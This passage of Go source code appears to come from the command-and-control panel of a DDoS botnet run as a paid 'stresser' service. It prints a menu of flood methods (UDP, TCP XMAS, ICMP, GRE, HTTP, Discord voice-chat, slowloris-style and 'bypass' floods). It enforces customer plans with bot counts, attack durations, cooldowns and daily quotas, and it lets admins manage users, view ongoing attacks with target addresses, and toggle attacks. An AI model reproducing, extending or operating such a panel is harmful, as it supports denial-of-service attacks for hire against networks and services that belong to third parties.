            this.conn.Write([]byte("\x1b[38;5;135mstdhex       \x1b[38;5;231m-->   \x1b[0mStandard + hex flood (header + hex spam)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mnudp         \x1b[38;5;231m-->   \x1b[0mNUDP flood (high-speed UDP with patterns)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mudphex       \x1b[38;5;231m-->   \x1b[0mUDPHEX flood (random UDP hex spam)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mtcpxmas      \x1b[38;5;231m-->   \x1b[0mXMAS flood\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135msocket       \x1b[38;5;231m-->   \x1b[0mTCP socket flood (many sockets sending data)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mportstuff    \x1b[38;5;231m-->   \x1b[0mSlowloris like tcp socket flood for closing ports\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mrapidsocket  \x1b[38;5;231m-->   \x1b[0mSemi-fire-and-forget socket flood\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mdiscord      \x1b[38;5;231m-->   \x1b[0mDiscord VC flood\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mtcpbypass    \x1b[38;5;231m-->   \x1b[0mAdvanced TCP bypass\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135micmp         \x1b[38;5;231m-->   \x1b[0mICMP flood\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mgreip        \x1b[38;5;231m-->   \x1b[0mGREIP flood\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mgreeth       \x1b[38;5;231m-->   \x1b[0mGREETH flood\r\n"))




            if userInfo.Admin {
            this.conn.Write([]byte("\x1b[38;5;208mhttp         \x1b[38;5;231m-->   \x1b[0mHTTP FLOOD\r\n"))
            this.conn.Write([]byte("\x1b[38;5;208mhome         \x1b[38;5;231m-->   \x1b[0mHOME UDP FLOOD\r\n"))
            }

            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }

        if cmd == "plan" {
            userInfo, err := database.GetUserInfo(username)
            if err != nil {
                this.writePrompt(fmt.Sprintf("\x1b[31mError: %s\x1b[0m\r\n", err.Error()))
                continue
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[38;5;135m                       Account Information\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mUsername: \x1b[38;5;27m%s\x1b[0m\r\n", userInfo.Username)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mMax Bots: \x1b[38;5;27m%d\x1b[0m\r\n", userInfo.MaxBots)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mAdmin: \x1b[38;5;27m%t\x1b[0m\r\n", userInfo.Admin)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mCooldown: \x1b[38;5;27m%d seconds\x1b[0m\r\n", userInfo.Cooldown)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mMax Attack Duration: \x1b[38;5;27m%d seconds\x1b[0m\r\n", userInfo.DurationLimit)))

            if userInfo.Expiry == 0 {
                this.conn.Write([]byte("\x1b[38;5;231mExpiry: \x1b[38;5;27mNever\x1b[0m\r\n"))
            } else {
                remainingSeconds := userInfo.Expiry - time.Now().Unix()
                if remainingSeconds > 0 {
                    remainingDays := remainingSeconds / (24 * 3600)
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mExpiry: \x1b[38;5;27m%d days\x1b[0m\r\n", remainingDays)))
                } else {
                    this.conn.Write([]byte("\x1b[38;5;231mExpiry: \x1b[38;5;27mExpired\x1b[0m\r\n"))
                }
            }

            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mBanned: \x1b[38;5;27m%t\x1b[0m\r\n", userInfo.Banned)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mMax Concurrent Attacks: \x1b[38;5;27m%d\x1b[0m\r\n", userInfo.Conns)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mAPI Access: \x1b[38;5;27m%t\x1b[0m\r\n", userInfo.Api)))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mPowersaving Bypass: \x1b[38;5;27m%t\x1b[0m\r\n", userInfo.PowersavingBypass)))

            // Fix: don't pass an unused arg when DailyAttackMax == 0
            var huhtf string
            if userInfo.DailyAttackMax == 0 {
                huhtf = "\x1b[38;5;231mDaily Attacks: \x1b[38;5;27minf\x1b[0m\r\n"
            } else {
                huhtf = fmt.Sprintf("\x1b[38;5;231mDaily Attacks: \x1b[38;5;27m%d/%d\x1b[0m\r\n",
                    userInfo.DailyAttackCount, userInfo.DailyAttackMax)
            }
            this.conn.Write([]byte(huhtf))

            this.conn.Write([]byte("\r\n"))
            continue
        }

        if userInfo.Admin && cmd == "!help" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[38;5;135m                       Admin Commands\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers add\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers remove <username>\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers ban <username>\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers unban <username>\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers kick <username>\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers list\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231musers edit\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231monline\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mstatistics users\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mstatistics methods\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mlogs clear\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mlogs enable\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mlogs disable\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mglobal cons set <value>\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mglobal api disable/enable\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mglobal attacks disable/enable\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mstop\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231mcount\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if len(cmd) > 0 {
            log.SetFlags(log.LstdFlags)
            output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
            if err != nil {
                fmt.Println("Error: ", err)
            }
            usernameFormat := "username:"
            cmdFormat := "command:"
            cmdSplit := "|"
            log.SetOutput(output)
            log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd)
        }

        fields := strings.Fields(cmd)
        if len(fields) == 0 {
            return // or continue, or handle empty input however you want
        }

        switch strings.ToLower(fields[0]) {


        case "statistics":
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }
            parts := strings.Fields(cmd)
            if len(parts) < 2 {
                this.writePrompt("\x1b[31mUsage: statistics <methods|users>\x1b[0m\r\n")
                continue
            }
            subcommand := strings.ToLower(parts[1])
            switch subcommand {
            case "methods":
                methodsStats, err := database.getMethodsStatistics()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError: %s\x1b[0m\r\n", err.Error()))
                    continue
                }
                this.conn.Write([]byte("\033[2J\033[1;1H")) // Clear screen
                this.conn.Write([]byte("\x1b[38;5;135m                       Most Used Methods\r\n"))
                this.conn.Write([]byte("\x1b[38;5;231mMethod       | Count | Percentage\r\n"))
                this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------\r\n"))

                totalAttacks := 0
                for _, count := range methodsStats {
                    totalAttacks += count
                }

                type methodStat struct {
                    Method string
                    Count  int
                }
                var methodList []methodStat
                for method, count := range methodsStats {
                    methodList = append(methodList, methodStat{method, count})
                }
                sort.Slice(methodList, func(i, j int) bool {
                    return methodList[i].Count > methodList[j].Count
                })

                for _, ms := range methodList {
                    percentage := 0.0
                    if totalAttacks > 0 {
                        percentage = (float64(ms.Count) / float64(totalAttacks)) * 100
                    }
                    line := fmt.Sprintf("\x1b[38;5;231m%-12s | \x1b[38;5;27m%-5d\x1b[38;5;231m | \x1b[38;5;27m%.2f%%\x1b[38;5;231m\r\n", ms.Method, ms.Count, percentage)
                    this.conn.Write([]byte(line))
                }

                this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------\r\n"))
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal Attacks (in logs): \x1b[38;5;27m%d\x1b[38;5;231m\r\n", totalAttacks)))
                this.conn.Write([]byte("\r\n"))

            case "users":
                usersStats, err := database.getUsersStatistics()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError: %s\x1b[0m\r\n", err.Error()))
                    continue
                }
                this.conn.Write([]byte("\033[2J\033[1;1H")) // Clear screen
                this.conn.Write([]byte("\x1b[38;5;135m                       Top 15 Users by Attacks\r\n"))
                this.conn.Write([]byte("\x1b[38;5;231mUsername     | Count | Percentage\r\n"))
                this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------\r\n"))

                totalAttacks := 0
                for _, count := range usersStats {
                    totalAttacks += count
                }

                type userStat struct {
                    Username string
                    Count    int
                }
                var userList []userStat
                for username, count := range usersStats {
                    userList = append(userList, userStat{username, count})
                }
                sort.Slice(userList, func(i, j int) bool {
                    return userList[i].Count > userList[j].Count
                })
                if len(userList) > 15 {
                    userList = userList[:15]
                }

                for _, us := range userList {
                    percentage := 0.0
                    if totalAttacks > 0 {
                        percentage = (float64(us.Count) / float64(totalAttacks)) * 100
                    }
                    line := fmt.Sprintf("\x1b[38;5;231m%-12s | \x1b[38;5;27m%-5d\x1b[38;5;231m | \x1b[38;5;27m%.2f%%\x1b[38;5;231m\r\n", us.Username, us.Count, percentage)
                    this.conn.Write([]byte(line))
                }

                this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------\r\n"))
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal Attacks (in logs): \x1b[38;5;27m%d\x1b[38;5;231m\r\n", totalAttacks)))
                this.conn.Write([]byte("\r\n"))

            default:
                this.writePrompt("\x1b[31mInvalid statistics command: use methods or users\x1b[0m\r\n")
            }

        case "global":
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }
            parts := strings.Fields(cmd)
            if len(parts) < 2 {
                this.writePrompt("\x1b[31mUsage: global <api|attacks|cons> <action> [value]\x1b[0m\r\n")
                continue
            }
            switch strings.ToLower(parts[1]) {
            case "api":
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: global api <enable|disable>\x1b[0m\r\n")
                    continue
                }
                action := strings.ToLower(parts[2])
                switch action {
                case "enable":
                    err := database.SetGlobalApiEnabled(true)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError enabling API: %s\x1b[0m\r\n", err.Error()))
                    } else {
                        this.writePrompt("\x1b[38;5;117mGlobal API enabled\x1b[0m\r\n")
                    }
                case "disable":
                    err := database.SetGlobalApiEnabled(false)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError disabling API: %s\x1b[0m\r\n", err.Error()))
                    } else {
                        this.writePrompt("\x1b[38;5;117mGlobal API disabled\x1b[0m\r\n")
                    }
                default:
                    this.writePrompt("\x1b[31mInvalid action: use enable or disable\x1b[0m\r\n")
                }
            case "attacks":
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: global attacks <enable|disable>\x1b[0m\r\n")
                    continue
                }
                switch strings.ToLower(parts[2]) {
                case "enable":
                    err := database.SetGlobalAttacksEnabled(true)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError enabling attacks: %s\x1b[0m\r\n", err.Error()))
                    } else {
                        this.writePrompt("\x1b[38;5;117mGlobal attacks enabled\x1b[0m\r\n")
                    }
                case "disable":
                    err := database.SetGlobalAttacksEnabled(false)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError disabling attacks: %s\x1b[0m\r\n", err.Error()))
                    } else {
                        this.writePrompt("\x1b[38;5;117mGlobal attacks disabled\x1b[0m\r\n")
                    }
                default:
                    this.writePrompt("\x1b[31mInvalid action: use enable or disable\x1b[0m\r\n")
                }
            case "cons", "slots":
                if len(parts) != 4 || strings.ToLower(parts[2]) != "set" {
                    this.writePrompt("\x1b[31mUsage: global cons set <value>\x1b[0m\r\n")
                    continue
                }
                value, err := strconv.Atoi(parts[3])
                if err != nil {
                    this.writePrompt("\x1b[31mInvalid value\x1b[0m\r\n")
                    continue
                }
                if value <= 0 {
                    this.writePrompt("\x1b[31mValue must be greater than 0\x1b[0m\r\n")
                    continue
                }
                // Check if there are any running attacks
                database.mutex.Lock()
                currentTime := time.Now().Unix()
                hasRunningAttacks := false
                for _, attack := range database.attacks {
                    if attack.StartTime + int64(attack.Duration) > currentTime {
                        hasRunningAttacks = true
                        break
                    }
                }
                database.mutex.Unlock()
                if hasRunningAttacks {
                    this.writePrompt("\x1b[31mCannot change concurrent attacks limit while attacks are running\x1b[0m\r\n")
                    continue
                }
                // Set the new limit
                err = database.SetGlobalMaxConcurrentAttacks(value)
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mFailed to set global concurrent attacks limit: %s\x1b[0m\r\n", err.Error()))
                } else {
                    this.writePrompt(fmt.Sprintf("\x1b[38;5;117mGlobal concurrent attacks limit set to %d\x1b[0m\r\n", value))
                }
            default:
                this.writePrompt("\x1b[31mInvalid global command: use api, attacks, or cons\x1b[0m\r\n")
            }

        case "passwd":
            const maxAttempts = 3
            attempts := 0

            // Prompt for current password, up to maxAttempts
            for {
                if attempts >= maxAttempts {
                    this.writePrompt("\x1b[31mToo many incorrect attempts. Password change cancelled.\x1b[0m\r\n")
                    break // exit password attempt loop, return to main command prompt
                }

                if err := this.writePrompt("\x1b[38;5;135mEnter current password: \x1b[38;5;231m"); err != nil {
                    fmt.Fprintf(os.Stderr, "Error writing prompt: %v\n", err)
                    this.writePrompt("\x1b[31mError writing prompt, please try again\x1b[0m\r\n")
                    attempts++
                    continue
                }

                currentPassword, err := this.ReadLine(true)
                if err != nil {
                    if err == io.EOF {
                        this.writePrompt("\r\n\x1b[31mInput closed unexpectedly\x1b[0m\r\n")
                        break
                    }
                    fmt.Fprintf(os.Stderr, "Error reading current password: %v\n", err)
                    this.writePrompt("\x1b[31mError reading input, please try again\x1b[0m\r\n")
                    attempts++
                    continue
                }

                if currentPassword == "" {
                    this.writePrompt("\x1b[31mPassword cannot be empty\x1b[0m\r\n")
                    attempts++
                    continue
                }

                loggedIn, _, errMsg := database.TryLogin(username, currentPassword)
                if !loggedIn {
                    this.writePrompt("\x1b[31m" + errMsg + "\x1b[0m\r\n")
                    attempts++
                    continue
                }

                break // successfully authenticated
            }

            // If not authenticated after attempts, skip rest
            if attempts >= maxAttempts {
                break
            }

            // Prompt for new password
            if err := this.writePrompt("\x1b[38;5;135mEnter new password: \x1b[38;5;231m"); err != nil {
                fmt.Fprintf(os.Stderr, "Error writing new password prompt: %v\n", err)
                this.writePrompt("\x1b[31mError writing prompt, returning to main menu\x1b[0m\r\n")
                break
            }

            newPassword, err := this.ReadLine(true)
            if err != nil {
                fmt.Fprintf(os.Stderr, "Error reading new password: %v\n", err)
                this.writePrompt("\x1b[31mError reading input, returning to main menu\x1b[0m\r\n")
                break
            }

            if newPassword == "" {
                this.writePrompt("\x1b[31mPassword cannot be empty\x1b[0m\r\n")
                break
            }

            // Confirm new password
            if err := this.writePrompt("\x1b[38;5;135mConfirm new password: \x1b[38;5;231m"); err != nil {
                fmt.Fprintf(os.Stderr, "Error writing confirm password prompt: %v\n", err)
                this.writePrompt("\x1b[31mError writing prompt, returning to main menu\x1b[0m\r\n")
                break
            }

            confirmPassword, err := this.ReadLine(true)
            if err != nil {
                fmt.Fprintf(os.Stderr, "Error reading confirm password: %v\n", err)
                this.writePrompt("\x1b[31mError reading input, returning to main menu\x1b[0m\r\n")
                break
            }

            if newPassword != confirmPassword {
                this.writePrompt("\x1b[31mPasswords do not match\x1b[0m\r\n")
                break
            }

            // Update password
            if err := database.SetUserPassword(username, newPassword); err != nil {
                fmt.Fprintf(os.Stderr, "Error setting password: %v\n", err)
                this.writePrompt(fmt.Sprintf("\x1b[31mFailed to change password: %s\x1b[0m\r\n", err.Error()))
                break
            }

            this.writePrompt("\x1b[38;5;117mPassword changed successfully\x1b[0m\r\n")
            break // End of "passwd" case — return to command prompt



        case "online":
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }
            sessionsMutex.Lock()
            onlineUsers := make([]string, 0, len(activeSessions))
            for user := range activeSessions {
                onlineUsers = append(onlineUsers, user)
            }
            sessionsMutex.Unlock()

            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[38;5;231mUsername     | Admin | Daily Left | Expiry     | Running Attacks\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|------------|------------|-----------------\r\n"))
            for _, user := range onlineUsers {
                userInfo, err := database.GetUserInfo(user)
                if err != nil {
                    continue
                }
                adminStr := "No"
                if userInfo.Admin {
                    adminStr = "Yes"
                }
                dailyLeft := "Unlimited"
                if userInfo.DailyAttackMax > 0 {
                    dailyLeft = fmt.Sprintf("%d", userInfo.DailyAttackMax-userInfo.DailyAttackCount)
                }
                expiryStr := "Never"
                if userInfo.Expiry != 0 {
                    remainingSeconds := userInfo.Expiry - time.Now().Unix()
                    if remainingSeconds > 0 {
                        remainingDays := remainingSeconds / (24 * 3600)
                        expiryStr = fmt.Sprintf("%d days", remainingDays)
                    } else {
                        expiryStr = "Expired"
                    }
                }
                runningAttacks := database.fetchUserRunningAttacks(user)
                line := fmt.Sprintf("\x1b[38;5;231m%-12s | %-5s | %-10s | %-10s | %-15d\r\n",
                    user, adminStr, dailyLeft, expiryStr, runningAttacks)
                this.conn.Write([]byte(line))
            }
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal Online: \x1b[38;5;27m%d\r\n", len(onlineUsers))))
            this.conn.Write([]byte("\r\n"))
            continue

        case "ongoing":
            database.mutex.Lock()
            currentTime := time.Now().Unix()
            var ongoingAttacks []AttackRecord
            maxFlagsLen := len("Flags")

            for _, attack := range database.attacks {
                if attack.StartTime+int64(attack.Duration) > currentTime {
                    flags := extractFlags(attack.Command)
                    if len(flags) > maxFlagsLen {
                        maxFlagsLen = len(flags)
                    }
                    ongoingAttacks = append(ongoingAttacks, attack)
                }
            }
            database.mutex.Unlock()

            this.conn.Write([]byte("\033[2J\033[1;1H")) // Clear screen
            this.conn.Write([]byte("\x1b[38;5;135m                       Ongoing Attacks\r\n"))

            // Header
            header := fmt.Sprintf("\x1b[38;5;231mUsername     | Target       | Time Left | %-*s\r\n", maxFlagsLen, "Flags")
            divider := fmt.Sprintf("\x1b[38;5;231m-------------|--------------|-----------|-%s\r\n", strings.Repeat("-", maxFlagsLen))
            this.conn.Write([]byte(header))
            this.conn.Write([]byte(divider))

            // Rows
            for _, attack := range ongoingAttacks {
                var displayUsername, displayTarget, displayFlags string

                if userInfo.Admin || attack.Username == username {
                    displayUsername = attack.Username
                    displayTarget = extractTarget(attack.Command)
                    displayFlags = extractFlags(attack.Command)
                } else {
                    displayUsername = "*****"
                    displayTarget = "*.*.*.*"
                    realFlags := extractFlags(attack.Command)
                    displayFlags = strings.Repeat("*", len(realFlags))
                }

                timeLeft := attack.StartTime + int64(attack.Duration) - currentTime

                line := fmt.Sprintf("\x1b[38;5;231m%-12s | %-12s | %-8ds | %-*s\r\n",
                    displayUsername, displayTarget, timeLeft, maxFlagsLen, displayFlags)
                this.conn.Write([]byte(line))
            }

            this.conn.Write([]byte("\r\n"))


        case "users":
            // Ensure the user has admin privileges
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }

            // Split the command into parts
            parts := strings.Fields(cmd)
            if len(parts) < 2 {
                this.writePrompt("\x1b[31mUsage: users <add|remove|ban|unban|kick|list|edit> [...]\x1b[0m\r\n")
                continue
            }

            // Extract and normalize the subcommand
            subcommand := strings.ToLower(parts[1])

            switch subcommand {
            case "add":
                // Prompt for and validate new username
                if err := this.writePrompt("Enter New Username: "); err != nil {
                    return
                }
                newUn, err := this.ReadLine(false)
                if err != nil || newUn == "" {
                    this.writePrompt("\x1b[31mInvalid username\x1b[0m\r\n")
                    continue
                }

                // Prompt for and validate new password
                if err := this.writePrompt("Choose New Password: "); err != nil {
                    return
                }
                newPw, err := this.ReadLine(false)
                if err != nil || newPw == "" {
                    this.writePrompt("\x1b[31mInvalid password\x1b[0m\r\n")
                    continue
                }

                // Prompt for admin status
                if err := this.writePrompt("Is this user an admin? (y/n): "); err != nil {
                    return
                }
                isAdminStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                isAdmin := strings.ToLower(isAdminStr) == "y"

                // Prompt for bot count
                if err := this.writePrompt("Enter Bot Count (-1 for Full Bots): "); err != nil {
                    return
                }
                maxBotsStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                maxBots, err := strconv.Atoi(maxBotsStr)
                if err != nil {
                    this.writePrompt("\x1b[31mInvalid bot count\x1b[0m\r\n")
                    continue
                }

                // Prompt for max attack duration
                if err := this.writePrompt("Max Attack Duration: "); err != nil {
                    return
                }
                durationStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                duration, err := strconv.Atoi(durationStr)
                if err != nil {
                    this.writePrompt("\x1b[31mInvalid duration\x1b[0m\r\n")
                    continue
                }

                // Prompt for cooldown
                if err := this.writePrompt("Cooldown: "); err != nil {
                    return
                }
                cooldownStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                cooldown, err := strconv.Atoi(cooldownStr)
                if err != nil || cooldown < 0 {
                    this.writePrompt("\x1b[31mInvalid cooldown\x1b[0m\r\n")
                    continue
                }

                // Prompt for max concurrent attacks
                if err := this.writePrompt("Max Concurrent Attacks: "); err != nil {
                    return
                }
                connsStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                conns, err := strconv.Atoi(connsStr)
                if err != nil || conns < 0 {
                    this.writePrompt("\x1b[31mInvalid concurrent attacks\x1b[0m\r\n")
                    continue
                }

                // Prompt for plan duration in days
                if err := this.writePrompt("Plan duration in days (0 for unlimited): "); err != nil {
                    return
                }
                expiryDaysStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                expiryDays, err := strconv.Atoi(expiryDaysStr)
                if err != nil || expiryDays < 0 {
                    this.writePrompt("\x1b[31mInvalid number of days\x1b[0m\r\n")
                    continue
                }

                // Prompt for max daily attacks
                if err := this.writePrompt("Max Daily Attacks (0 for unlimited): "); err != nil {
                    return
                }
                dailyAttackMaxStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                dailyAttackMax, err := strconv.Atoi(dailyAttackMaxStr)
                if err != nil || dailyAttackMax < 0 {
                    this.writePrompt("\x1b[31mInvalid daily attack max\x1b[0m\r\n")
                    continue
                }

                // Prompt for powersaving bypass
                if err := this.writePrompt("Bypass powersaving? (y/n): "); err != nil {
                    return
                }
                powersavingBypassStr, err := this.ReadLine(false)
                if err != nil {
                    return
                }
                powersavingBypass := strings.ToLower(powersavingBypassStr) == "y"

                // Create the user in the database
                if !database.CreateUser(newUn, newPw, maxBots, duration, cooldown, expiryDays, conns, dailyAttackMax, isAdmin, false, powersavingBypass) {
                    this.writePrompt("\x1b[31mFailed to create user: Username may already exist\x1b[0m\r\n")
                } else {
                    this.writePrompt("\x1b[38;5;117mUser created successfully\x1b[0m\r\n")
                }

            case "remove":
                // Validate input and remove user
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: users remove <username>\x1b[0m\r\n")
                    continue
                }
                usernameToRemove := parts[2]
                if database.removeUser(usernameToRemove) {
                    this.writePrompt("\x1b[38;5;117mUser removed\x1b[0m\r\n")
                } else {
                    this.writePrompt("\x1b[31mUser not found\x1b[0m\r\n")
                }

            case "ban":
                // Validate input and ban user
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: users ban <username>\x1b[0m\r\n")
                    continue
                }
                usernameToBan := parts[2]
                success, err := database.BanUser(usernameToBan)
                if success {
                    this.writePrompt("\x1b[38;5;117mUser banned successfully\x1b[0m\r\n")
                } else {
                    this.writePrompt(fmt.Sprintf("\x1b[31mFailed to ban user: %s\x1b[0m\r\n", err.Error()))
                }

            case "unban":
                // Validate input and unban user
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: users unban <username>\x1b[0m\r\n")
                    continue
                }
                usernameToUnban := parts[2]
                success, err := database.UnbanUser(usernameToUnban)
                if success {
                    this.writePrompt("\x1b[38;5;117mUser unbanned successfully\x1b[0m\r\n")
                } else {
                    this.writePrompt(fmt.Sprintf("\x1b[31mFailed to unban user: %s\x1b[0m\r\n", err.Error()))
                }

            case "kick":
                // Validate input and kick user
                if len(parts) != 3 {
                    this.writePrompt("\x1b[31mUsage: users kick <username>\x1b[0m\r\n")
                    continue
                }
                usernameToKick := parts[2]
                sessionsMutex.Lock()
                if conn, exists := activeSessions[usernameToKick]; exists {
                    conn.Close()
                    delete(activeSessions, usernameToKick)
                    sessionsMutex.Unlock()
                    this.writePrompt(fmt.Sprintf("\x1b[38;5;117mUser %s kicked successfully\x1b[0m\r\n", usernameToKick))
                } else {
                    sessionsMutex.Unlock()
                    this.writePrompt(fmt.Sprintf("\x1b[31mUser %s is not online\x1b[0m\r\n", usernameToKick))
                }

            case "list":
                users, err := database.ListUsers()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError: %s\x1b[0m\r\n", err.Error()))
                    continue
                }
                this.conn.Write([]byte("\033[2J\033[1;1H")) // Clear screen
                this.conn.Write([]byte("\x1b[38;5;231mUsername     | Admin | Conns | MaxTime | Cooldown | Expiry     | Banned | API \r\n"))
                this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-------|---------|----------|------------|--------|------\r\n"))
                for _, user := range users {
                    adminStr := fmt.Sprintf("%t", user.Admin)
                    expiryStr := "Never"
                    if user.Expiry != 0 {
                        remainingSeconds := user.Expiry - time.Now().Unix()
                        if remainingSeconds > 0 {
                            remainingDays := remainingSeconds / (24 * 3600)
                            expiryStr = fmt.Sprintf("%d days", remainingDays)
                        } else {
                            expiryStr = "Expired"
                        }
                    }
                    bannedStr := "No"
                    if user.Banned {
                        bannedStr = "Yes"
                    }
                    apiStr := fmt.Sprintf("%t", user.Api)
                    line := fmt.Sprintf("\x1b[38;5;231m%-12s | %-5s | %-5d | %-7d | %-8d | %-10s | %-6s | %-4s \r\n",
                        user.Username, adminStr, user.Conns, user.DurationLimit, user.Cooldown, expiryStr, bannedStr, apiStr)
                    this.conn.Write([]byte(line))
                }
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal Users: \x1b[38;5;27m%d\x1b[0m\r\n", len(users))))

            case "edit":
                // Validate input for edit subcommand
                if len(parts) < 5 {
                    this.writePrompt("\x1b[31mUsage: users edit <username|*> <cons|maxtime|cooldown|days|daily|api|admin|powersaving_bypass|password> <add|remove|set|true|false|reset> [...]\x1b[0m\r\n")
                    continue
                }

                targetUsername := parts[2]
                attribute := strings.ToLower(parts[3])
                action := strings.ToLower(parts[4])

                // Determine target usernames (single user or all)
                var usernames []string
                if targetUsername == "*" {
                    dbData, err := database.readUsers()
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mFailed to read database: %s\x1b[0m\r\n", err.Error()))
                        continue
                    }
                    if len(dbData.Users) == 0 {
                        this.writePrompt("\x1b[31mNo users found in the database\x1b[0m\r\n")
                        continue
                    }
                    for _, user := range dbData.Users {
                        usernames = append(usernames, user.Username)
                    }
                } else {
                    _, err := database.GetUserInfo(targetUsername)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mUser %s not found\x1b[0m\r\n", targetUsername))
                        continue
                    }
                    usernames = []string{targetUsername}
                }

                // Handle password attribute
                if attribute == "password" {
                    if action != "set" {
                        this.writePrompt("\x1b[31mPassword can only be modified with 'set' action\x1b[0m\r\n")
                        continue
                    }
                    if len(parts) < 6 {
                        this.writePrompt("\x1b[31mMissing amount value. Usage: users edit <username|*> <cons|maxtime|cooldown|days|daily> <add|remove|set> <amount>\x1b[0m\r\n")
                        continue
                    }

                    newPassword := parts[5]
                    if newPassword == "" {
                        this.writePrompt("\x1b[31mPassword cannot be empty\x1b[0m\r\n")
                        continue
                    }
                    for _, username := range usernames {
                        err := database.SetUserPassword(username, newPassword)
                        if err != nil {
                            this.writePrompt(fmt.Sprintf("\x1b[31mFailed to set password for user %s: %s\x1b[0m\r\n", username, err.Error()))
                        } else {
                            this.writePrompt(fmt.Sprintf("\x1b[38;5;117mPassword set successfully for user %s\x1b[0m\r\n", username))
                        }
                    }
                } else if attribute == "api" || attribute == "admin" || attribute == "powersaving_bypass" {
                    if action != "true" && action != "false" {
                        this.writePrompt(fmt.Sprintf("\x1b[31m%s value must be 'true' or 'false'\x1b[0m\r\n", attribute))
                        continue
                    }
                    boolValue := action == "true"
                    for _, username := range usernames {
                        var dbErr error
                        switch attribute {
                        case "api":
                            dbErr = database.SetUserApi(username, boolValue)
                        case "admin":
                            dbErr = database.SetUserAdmin(username, boolValue)
                        case "powersaving_bypass":
                            dbErr = database.SetUserPowersavingBypass(username, boolValue)
                        }
                        if dbErr != nil {
